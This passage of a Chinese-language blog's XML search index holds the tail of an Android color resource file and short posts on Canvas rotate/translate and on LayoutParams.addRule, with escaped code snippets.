name="lightsalmon"&gt;#FFA07A&lt;/color&gt;&lt;!--亮肉色 --&gt; &lt;color name="darkorange"&gt;#FF8C00&lt;/color&gt;&lt;!--暗桔黄色 --&gt; &lt;color name="coral"&gt;#FF7F50&lt;/color&gt;&lt;!--珊瑚色 --&gt; &lt;color name="hotpink"&gt;#FF69B4&lt;/color&gt;&lt;!--热粉红色 --&gt; &lt;color name="tomato"&gt;#FF6347&lt;/color&gt;&lt;!--西红柿色 --&gt; &lt;color name="orangered"&gt;#FF4500&lt;/color&gt;&lt;!--红橙色 --&gt; &lt;color name="deeppink"&gt;#FF1493&lt;/color&gt;&lt;!--深粉红色 --&gt; &lt;color name="fuchsia"&gt;#FF00FF&lt;/color&gt;&lt;!--紫红色 --&gt; &lt;color name="magenta"&gt;#FF00FF&lt;/color&gt;&lt;!--红紫色 --&gt; &lt;color name="red"&gt;#FF0000&lt;/color&gt;&lt;!--红色 --&gt; &lt;color name="oldlace"&gt;#FDF5E6&lt;/color&gt;&lt;!--老花色 --&gt; &lt;color name="lightgoldenrodyellow"&gt;#FAFAD2&lt;/color&gt;&lt;!--亮金黄色 --&gt; &lt;color name="linen"&gt;#FAF0E6&lt;/color&gt;&lt;!--亚麻色 --&gt; &lt;color name="antiquewhite"&gt;#FAEBD7&lt;/color&gt;&lt;!--古董白 --&gt; &lt;color name="salmon"&gt;#FA8072&lt;/color&gt;&lt;!--鲜肉色 --&gt; &lt;color name="ghostwhite"&gt;#F8F8FF&lt;/color&gt;&lt;!--幽灵白 --&gt; &lt;color name="mintcream"&gt;#F5FFFA&lt;/color&gt;&lt;!--薄荷色 --&gt; &lt;color name="whitesmoke"&gt;#F5F5F5&lt;/color&gt;&lt;!--烟白色 --&gt; &lt;color name="beige"&gt;#F5F5DC&lt;/color&gt;&lt;!--米色 --&gt; &lt;color name="wheat"&gt;#F5DEB3&lt;/color&gt;&lt;!--浅黄色 --&gt; &lt;color name="sandybrown"&gt;#F4A460&lt;/color&gt;&lt;!--沙褐色--&gt; &lt;color name="azure"&gt;#F0FFFF&lt;/color&gt;&lt;!--天蓝色 --&gt; &lt;color name="honeydew"&gt;#F0FFF0&lt;/color&gt;&lt;!--蜜色 --&gt; &lt;color name="aliceblue"&gt;#F0F8FF&lt;/color&gt;&lt;!--艾利斯兰 --&gt; &lt;color name="khaki"&gt;#F0E68C&lt;/color&gt;&lt;!--黄褐色 --&gt; &lt;color name="lightcoral"&gt;#F08080&lt;/color&gt;&lt;!--亮珊瑚色 --&gt; &lt;color name="palegoldenrod"&gt;#EEE8AA&lt;/color&gt;&lt;!--苍麒麟色 --&gt; &lt;color name="violet"&gt;#EE82EE&lt;/color&gt;&lt;!--紫罗兰色 --&gt; &lt;color name="darksalmon"&gt;#E9967A&lt;/color&gt;&lt;!--暗肉色 --&gt; &lt;color name="lavender"&gt;#E6E6FA&lt;/color&gt;&lt;!--淡紫色 --&gt; &lt;color name="lightcyan"&gt;#E0FFFF&lt;/color&gt;&lt;!--亮青色 --&gt; &lt;color name="burlywood"&gt;#DEB887&lt;/color&gt;&lt;!--实木色 --&gt; &lt;color name="plum"&gt;#DDA0DD&lt;/color&gt;&lt;!--洋李色 --&gt; &lt;color name="gainsboro"&gt;#DCDCDC&lt;/color&gt;&lt;!--淡灰色 --&gt; &lt;color name="crimson"&gt;#DC143C&lt;/color&gt;&lt;!--暗深红色 --&gt; &lt;color name="palevioletred"&gt;#DB7093&lt;/color&gt;&lt;!--苍紫罗兰色 --&gt; &lt;color name="goldenrod"&gt;#DAA520&lt;/color&gt;&lt;!--金麒麟色 --&gt; &lt;color name="orchid"&gt;#DA70D6&lt;/color&gt;&lt;!--淡紫色 --&gt; &lt;color name="thistle"&gt;#D8BFD8&lt;/color&gt;&lt;!--蓟色 --&gt; &lt;color name="lightgray"&gt;#D3D3D3&lt;/color&gt;&lt;!--亮灰色 --&gt; &lt;color name="lightgrey"&gt;#D3D3D3&lt;/color&gt;&lt;!--亮灰色 --&gt; &lt;color name="tan"&gt;#D2B48C&lt;/color&gt;&lt;!--茶色 --&gt; &lt;color name="chocolate"&gt;#D2691E&lt;/color&gt;&lt;!--巧可力色 --&gt; &lt;color name="peru"&gt;#CD853F&lt;/color&gt;&lt;!--秘鲁色 --&gt; &lt;color name="indianred"&gt;#CD5C5C&lt;/color&gt;&lt;!--印第安红 --&gt; &lt;color name="mediumvioletred"&gt;#C71585&lt;/color&gt;&lt;!--中紫罗兰色 --&gt; &lt;color name="silver"&gt;#C0C0C0&lt;/color&gt;&lt;!--银色 --&gt; &lt;color name="darkkhaki"&gt;#BDB76B&lt;/color&gt;&lt;!--暗黄褐色 --&gt; &lt;color name="rosybrown"&gt;#BC8F8F&lt;/color&gt; &lt;!--褐玫瑰红 --&gt; &lt;color name="mediumorchid"&gt;#BA55D3&lt;/color&gt;&lt;!--中粉紫色 --&gt; &lt;color name="darkgoldenrod"&gt;#B8860B&lt;/color&gt;&lt;!--暗金黄色 --&gt; &lt;color name="firebrick"&gt;#B22222&lt;/color&gt;&lt;!--火砖色 --&gt; &lt;color name="powderblue"&gt;#B0E0E6&lt;/color&gt;&lt;!--粉蓝色 --&gt; &lt;color name="lightsteelblue"&gt;#B0C4DE&lt;/color&gt;&lt;!--亮钢兰色 --&gt; &lt;color name="paleturquoise"&gt;#AFEEEE&lt;/color&gt;&lt;!--苍宝石绿 --&gt; &lt;color name="greenyellow"&gt;#ADFF2F&lt;/color&gt;&lt;!--黄绿色 --&gt; &lt;color name="lightblue"&gt;#ADD8E6&lt;/color&gt;&lt;!--亮蓝色 --&gt; &lt;color name="darkgray"&gt;#A9A9A9&lt;/color&gt;&lt;!--暗灰色 --&gt; &lt;color name="darkgrey"&gt;#A9A9A9&lt;/color&gt;&lt;!--暗灰色 --&gt; &lt;color name="brown"&gt;#A52A2A&lt;/color&gt;&lt;!--褐色 --&gt; &lt;color name="sienna"&gt;#A0522D&lt;/color&gt;&lt;!--赭色 --&gt; &lt;color name="darkorchid"&gt;#9932CC&lt;/color&gt;&lt;!--暗紫色--&gt; &lt;color name="palegreen"&gt;#98FB98&lt;/color&gt;&lt;!--苍绿色 --&gt; &lt;color name="darkviolet"&gt;#9400D3&lt;/color&gt;&lt;!--暗紫罗兰色 --&gt; &lt;color name="mediumpurple"&gt;#9370DB&lt;/color&gt;&lt;!--中紫色 --&gt; &lt;color name="lightgreen"&gt;#90EE90&lt;/color&gt;&lt;!--亮绿色 --&gt; &lt;color name="darkseagreen"&gt;#8FBC8F&lt;/color&gt;&lt;!--暗海兰色 --&gt; &lt;color name="saddlebrown"&gt;#8B4513&lt;/color&gt;&lt;!--重褐色 --&gt; &lt;color name="darkmagenta"&gt;#8B008B&lt;/color&gt;&lt;!--暗洋红 --&gt; &lt;color name="darkred"&gt;#8B0000&lt;/color&gt;&lt;!--暗红色 --&gt; &lt;color name="blueviolet"&gt;#8A2BE2&lt;/color&gt;&lt;!--紫罗兰蓝色 --&gt; &lt;color name="lightskyblue"&gt;#87CEFA&lt;/color&gt;&lt;!--亮天蓝色 --&gt; &lt;color name="skyblue"&gt;#87CEEB&lt;/color&gt;&lt;!--天蓝色 --&gt; &lt;color name="gray"&gt;#808080&lt;/color&gt;&lt;!--灰色 --&gt; &lt;color name="grey"&gt;#808080&lt;/color&gt;&lt;!--灰色 --&gt; &lt;color name="olive"&gt;#808000&lt;/color&gt;&lt;!--橄榄色 --&gt; &lt;color name="purple"&gt;#800080&lt;/color&gt;&lt;!--紫色 --&gt; &lt;color name="maroon"&gt;#800000&lt;/color&gt;&lt;!--粟色 --&gt; &lt;color name="aquamarine"&gt;#7FFFD4&lt;/color&gt;&lt;!--碧绿色--&gt; &lt;color name="chartreuse"&gt;#7FFF00&lt;/color&gt;&lt;!--黄绿色 --&gt; &lt;color name="lawngreen"&gt;#7CFC00&lt;/color&gt;&lt;!--草绿色 --&gt; &lt;color name="mediumslateblue"&gt;#7B68EE&lt;/color&gt;&lt;!--中暗蓝色 --&gt; &lt;color name="lightslategray"&gt;#778899&lt;/color&gt;&lt;!--亮蓝灰 --&gt; &lt;color name="lightslategrey"&gt;#778899&lt;/color&gt;&lt;!--亮蓝灰 --&gt; &lt;color name="slategray"&gt;#708090&lt;/color&gt;&lt;!--灰石色 --&gt; &lt;color name="slategrey"&gt;#708090&lt;/color&gt;&lt;!--灰石色 --&gt; &lt;color name="olivedrab"&gt;#6B8E23&lt;/color&gt;&lt;!--深绿褐色 --&gt; &lt;color name="slateblue"&gt;#6A5ACD&lt;/color&gt;&lt;!--石蓝色 --&gt; &lt;color name="dimgray"&gt;#696969&lt;/color&gt;&lt;!--暗灰色 --&gt; &lt;color name="dimgrey"&gt;#696969&lt;/color&gt;&lt;!--暗灰色 --&gt; &lt;color name="mediumaquamarine"&gt;#66CDAA&lt;/color&gt;&lt;!--中绿色 --&gt; &lt;color name="cornflowerblue"&gt;#6495ED&lt;/color&gt;&lt;!--菊兰色 --&gt; &lt;color name="cadetblue"&gt;#5F9EA0&lt;/color&gt;&lt;!--军兰色 --&gt; &lt;color name="darkolivegreen"&gt;#556B2F&lt;/color&gt;&lt;!--暗橄榄绿 --&gt; &lt;color name="indigo"&gt;#4B0082&lt;/color&gt;&lt;!--靛青色 --&gt; &lt;color name="mediumturquoise"&gt;#48D1CC&lt;/color&gt;&lt;!--中绿宝石 --&gt; &lt;color name="darkslateblue"&gt;#483D8B&lt;/color&gt;&lt;!--暗灰蓝色 --&gt; &lt;color name="steelblue"&gt;#4682B4&lt;/color&gt;&lt;!--钢兰色 --&gt; &lt;color name="royalblue"&gt;#4169E1&lt;/color&gt;&lt;!--皇家蓝 --&gt; &lt;color name="turquoise"&gt;#40E0D0&lt;/color&gt;&lt;!--青绿色 --&gt; &lt;color name="mediumseagreen"&gt;#3CB371&lt;/color&gt;&lt;!--中海蓝 --&gt; &lt;color name="limegreen"&gt;#32CD32&lt;/color&gt;&lt;!--橙绿色 --&gt; &lt;color name="darkslategray"&gt;#2F4F4F&lt;/color&gt;&lt;!--暗瓦灰色 --&gt; &lt;color name="darkslategrey"&gt;#2F4F4F&lt;/color&gt;&lt;!--暗瓦灰色 --&gt; &lt;color name="seagreen"&gt;#2E8B57&lt;/color&gt;&lt;!--海绿色 --&gt; &lt;color name="forestgreen"&gt;#228B22&lt;/color&gt;&lt;!--森林绿 --&gt; &lt;color name="lightseagreen"&gt;#20B2AA&lt;/color&gt;&lt;!--亮海蓝色 --&gt; &lt;color name="dodgerblue"&gt;#1E90FF&lt;/color&gt;&lt;!--闪兰色 --&gt; &lt;color name="midnightblue"&gt;#191970&lt;/color&gt;&lt;!--中灰兰色 --&gt; &lt;color name="aqua"&gt;#00FFFF&lt;/color&gt;&lt;!--浅绿色 --&gt; &lt;color name="cyan"&gt;#00FFFF&lt;/color&gt;&lt;!--青色 --&gt; &lt;color name="springgreen"&gt;#00FF7F&lt;/color&gt;&lt;!--春绿色--&gt; &lt;color name="lime"&gt;#00FF00&lt;/color&gt;&lt;!--酸橙色 --&gt; &lt;color name="mediumspringgreen"&gt;#00FA9A&lt;/color&gt;&lt;!--中春绿色 --&gt; &lt;color name="darkturquoise"&gt;#00CED1&lt;/color&gt;&lt;!--暗宝石绿 --&gt; &lt;color name="deepskyblue"&gt;#00BFFF&lt;/color&gt;&lt;!--深天蓝色 --&gt; &lt;color name="darkcyan"&gt;#008B8B&lt;/color&gt;&lt;!--暗青色 --&gt; &lt;color name="teal"&gt;#008080&lt;/color&gt;&lt;!--水鸭色 --&gt; &lt;color name="green"&gt;#008000&lt;/color&gt;&lt;!--绿色 --&gt; &lt;color name="darkgreen"&gt;#006400&lt;/color&gt;&lt;!--暗绿色 --&gt; &lt;color name="blue"&gt;#0000FF&lt;/color&gt;&lt;!--蓝色 --&gt; &lt;color name="mediumblue"&gt;#0000CD&lt;/color&gt;&lt;!--中兰色 --&gt; &lt;color name="darkblue"&gt;#00008B&lt;/color&gt;&lt;!--暗蓝色 --&gt; &lt;color name="navy"&gt;#000080&lt;/color&gt;&lt;!--海军色 --&gt; &lt;color name="black"&gt;#000000&lt;/color&gt;&lt;!--黑色 --&gt; &lt;/resources&gt;]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>配置文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Canvas中rotate,translate,save和restore]]></title>
    <url>%2Fposts%2Frotate%2Ctranslate%2Csave_and_restore_of_Canvas.html</url>
    <content type="text"><![CDATA[rotate()rotate()是对坐标系的旋转，而不是对屏幕的旋转。1234567@Overrideprotected void onDraw(Canvas canvas) &#123; canvas.drawRect(100, 100, 150, 150, mPrePaint);//画出蓝色矩形 canvas.rotate(30);//顺时针旋转30度 canvas.drawRect(200, 200, 250, 250, mLastPaint);//画出黄色矩形 super.onDraw(canvas);//画出文字&#125; 效果如下： 很明显，在坐标系旋转前，画出的蓝色矩形并没有跟着坐标系的旋转而旋转，而在坐标系旋转后，画出的黄色矩形和文字旋转了30度。rotate()有两个重载方法： rotate(float degrees); rotate(float degrees, float px, float py);明显第一个参数degrees是坐标系旋转的角度，正数为顺时针旋转，负数为逆时针旋转。px和py表示的是，以(px,py)为旋转中心，进行degrees度的旋转。如果使用第一个重载方法，则旋转中心(px,py)为(0,0)。 translate()translate()是对坐标系的平移。12345678910@Overrideprotected void onDraw(Canvas canvas) &#123; canvas.drawRect(100, 100, 150, 150, mPrePaint);//画出蓝色矩形 canvas.rotate(30);//顺时针旋转30° super.onDraw(canvas);//画出文字 canvas.drawRect(200, 200, 250, 250, mLastPaint);//画出黄色矩形 canvas.translate(500, 0);//往x轴正方向平移500单位长度 super.onDraw(canvas);//画出文字 canvas.drawRect(200, 200, 250, 250, mLastPaint);//画出黄色矩形&#125; 效果如下： 从上述例子可以看出，canvas绘图，实际上是以坐标系为基准进行绘图的。所有的图形都是由在坐标系原点的基础上进行计算并绘制。 那么，如果我们进行了很多次rotate()和translate()操作后，想回退到某一次操作后的坐标轴位置，应该怎么做呢？ Canvas中有两个方法save()和restore()，一个是存储，一个是回退。 save()无 restore()无]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>自定义View</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LayoutParams的addRule方法]]></title>
    <url>%2Fposts%2FaddRule_method_of_LayoutParams.html</url>
    <content type="text"><![CDATA[自定义ViewGroup中，需要用LayoutParams对子View进行布局123mLeftParams = new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.MATCH_PARENT);mLeftParams.addRule(RelativeLayout.ALIGN_PARENT_LEFT, TRUE);mLeftParams.addRule(RelativeLayout.RIGHT_OF, R.id.leftView); 等价于12android:layout_alignParentLeft="true"android:layout_toRightOf="@id/leftView"]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>自定义View</tag>
      </tags>
  </entry>
</search>
